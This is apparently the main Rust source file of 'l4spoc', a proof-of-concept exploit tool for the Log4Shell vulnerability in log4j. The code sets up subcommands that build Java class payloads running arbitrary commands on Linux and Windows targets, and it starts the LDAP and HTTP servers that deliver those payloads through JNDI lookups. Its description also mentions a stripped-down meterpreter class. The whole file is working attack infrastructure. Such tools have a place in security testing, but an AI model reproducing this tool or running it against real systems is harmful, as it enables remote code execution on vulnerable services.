#![feature(ip)]
#[macro_use]
extern crate tracing;
extern crate features;

mod web_server;
mod ldap_server;
mod build_java;
mod common;

use common::{ServerCfg, BuildCmdCfg};
use std::fs;
use std::env;
use get_if_addrs::{IfAddr, get_if_addrs};
use clap::{Arg, App, ArgMatches};
//use glob::glob;
//use std::path;

#[tokio::main]
async fn main() -> () {
    env::set_var("RUST_LOG", "all=info");
    tracing_subscriber::fmt::init();

    let matches = App::new("l4spoc")
        .version("0.1")
        .author("Walter Szewelanczyk. <walterszewelanczyk@gmail.com>")
        .about("This is a Rust based POC to show the \"Log4Shell\" vulnerability in log4j.  This can create command based jars for exploiting and also has a stripped down meterpreter class that will run in a thread of the exploited process.  This hosts the ldap server and the http server.")
        .subcommand(App::new("build_cmd")
            .short_flag('b')
            .about("Build java class payload")
            .arg(Arg::new("class_name")
                .long("class_name")
                .short('c')
                .takes_value(true)
                .required(true)
                .help("The name of the Class to build.  It is what you would request via jndi.  for a Cmd1.class you would use Cmd1")) 
            .arg(Arg::new("linux_cmd")
                .long("linux")
                .short('l')
                .takes_value(true)
                .default_value("")
                .help("The command to execute on Linux Systems via /bin/sh -c \"the_command\"")
            ).arg(Arg::new("windows_cmd")
                .long("windows")
                .short('w')
                .takes_value(true)
                .default_value("")
                .help("The command to execute on Windows Systems via cmd -C \"the_command\"")
            ).arg(Arg::new("build_path")
                .long("build_path")
                .short('b')
                .default_value("wwwroot")
                .takes_value(true)
                .help("the dir to build the payloads.  Will create if it doesn't exist.  Shoudl use same dir as www_root in run_servers.")
            ))
        .subcommand(App::new("run_servers")
            .short_flag('r')
            .about("Run the ldap and http servers")
            .arg(Arg::new("http_addr")
                .long("http_addr")
                .default_value("")
                .takes_value(true)
                .help("The http address to publish")
            ).arg(Arg::new("http_port")
                .long("http_port")
                .default_value("8080")
                .takes_value(true)
                .help("The http port used")
            ).arg(Arg::new("ldap_port")
                .long("ldap_port")
                .default_value("1389")
                .takes_value(true)
                .help("The LDAP port")
            ).arg(Arg::new("wwwroot")
                .long("wwwroot")
                .default_value("wwwroot")
                .takes_value(true)
                .help("The dir to server the payloads from.  Will create if it doesn't exist.  Note this should be the same build_path you used for any build_cmd classes.  You can also put in any other classes into this dir.")
            ))
        .get_matches();

    if let Some(m) = matches.subcommand_matches("build_cmd"){
        let cfg : BuildCmdCfg = convert_args_for_build_cmd(m);
        build_java::is_javac_installed();
        fs::create_dir_all(&cfg.build_path)
            .expect(&format!("Unable to create {} dir", cfg.build_path));    

        build_java::build_exec_cmd_class(cfg).expect("faild to build cmd");
    } else if let Some(m) = matches.subcommand_matches("run_servers"){
        let cfg : ServerCfg = convert_args_for_run_servers(m);
        build_java::is_javac_installed();
        run_servers(cfg).await;
    }
}

fn get_default_ip_addr_str() -> String{
    let addrs = match get_if_addrs() {
        Ok(a) => a,
        Err(_) => return "127.0.0.1".to_string()
    };

    for a in &addrs {
//        println!("{:?}", a);
        let ip = a.ip();
        if ip.is_ipv4() &&  ip.is_global(){
            return ip.to_string() 
        }
    }
    
    for a in &addrs {
        match &a.addr {
            IfAddr::V4(av4) => {
                if av4.broadcast.is_some() {
                    return av4.ip.to_string();
                }
            },
            _ => continue,
        }
    }

    return "127.0.0.1".to_string();
}


fn convert_args_for_run_servers(m : &ArgMatches) -> ServerCfg{
    let mut http_addr = m.value_of_t_or_exit("http_addr");
    if http_addr == "" { http_addr = get_default_ip_addr_str(); }
    
    return ServerCfg{
        web_root  : m.value_of_t_or_exit("wwwroot"),
        http_addr,
        http_port : m.value_of_t_or_exit("http_port"),
        ldap_port : m.value_of_t_or_exit("ldap_port")
    }
}

async fn run_servers(cfg : ServerCfg) -> () {
    fs::create_dir_all(&cfg.web_root)
        .expect(&format!("Unable to create {} dir", cfg.web_root));    
    println!("We will send the JNDI requests the base address of http://{}:{}", &cfg.http_addr, &cfg.http_port);
 //   show_payloads(&cfg);
    let wsf = web_server::start_web_server(cfg.clone());
    let lsf = ldap_server::start_ldap_server(cfg.clone());
    tokio::join!(wsf, lsf);
    tokio::signal::ctrl_c().await.unwrap();
    info!("after ctrl -c");
}

fn convert_args_for_build_cmd(m : &ArgMatches) -> BuildCmdCfg {
    return BuildCmdCfg{
        build_path : m.value_of_t_or_exit("build_path"),
        class_name : m.value_of_t_or_exit("class_name"),
        l_cmd : m.value_of_t_or_exit("linux_cmd"),
        w_cmd : m.value_of_t_or_exit("windows_cmd")
    }
}

//fn show_payloads(cfg : &ServerCfg) -> () {
//    let the_glob = format!("{}{}*.class", cfg.web_root, path::MAIN_SEPARATOR);
//    for item in glob(&the_glob).expect("Unable to read class files") {
//        match item {
//            Ok(path) => {
//                println!("{}", path.file_name().unwrap().to_str().unwrap());
//            },
//            Err(e) => println!("{:?}", e),
//        }
//    }
//    () 
//}
